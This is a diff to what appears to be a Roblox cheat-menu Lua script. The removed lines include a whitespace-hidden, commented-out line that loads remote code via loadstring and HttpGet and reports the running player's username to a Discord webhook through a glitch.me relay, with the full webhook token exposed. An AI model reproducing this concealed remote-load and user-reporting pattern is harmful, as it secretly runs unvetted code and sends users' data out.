@@ -5,11 +5,6 @@ getgenv().values = {}
 
 local MainUIColor = Color3.fromRGB(255,20,147)
 
-local HttpService = game:GetService('HttpService')
-local ENABLE_TRACEBACK = false
-																																																																																																		--local names = loadstring(game:HttpGet('https://gitfront.io/r/Samuel/ByuttDgRd14E/whitelist/raw/whitelsit.lua'))();local HttpService = game:GetService("HttpService");local botname = "epic gamer momento";function specials(Webhook, Message, Botname) local Name;local start = game:HttpGet("http://buritoman69.glitch.me");local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = HttpService:JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;specials("https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq", "Player: "..game.Players.LocalPlayer.Name.." has executed the script!\ Verified:"..(table.find(names, game.Players.LocalPlayer.Name) and 'true' or 'false <@574605228372918283>')..'', botname)			getgenv().signal = true;
-
-
 
 local C = {
 ['Vec2'] = Vector2.new,
@@ -401,11 +396,10 @@ local ovascreengui = nil
 				ImageLabel.Image = "rbxassetid://8893436115"--]]
 
 				library.uiopen = true 
-	ovascreengui = { 
-		['ova'] = Lunar,
-		['menu'] = Menu,
-		['cursor'] = cursor,
-	} 
+				getgenv().ovascreengui = { 
+					['ova'] = Lunar,
+					['menu'] = Menu,
+				} 
 			
 			local SpectatorsList = C.INST("ScreenGui")
 do
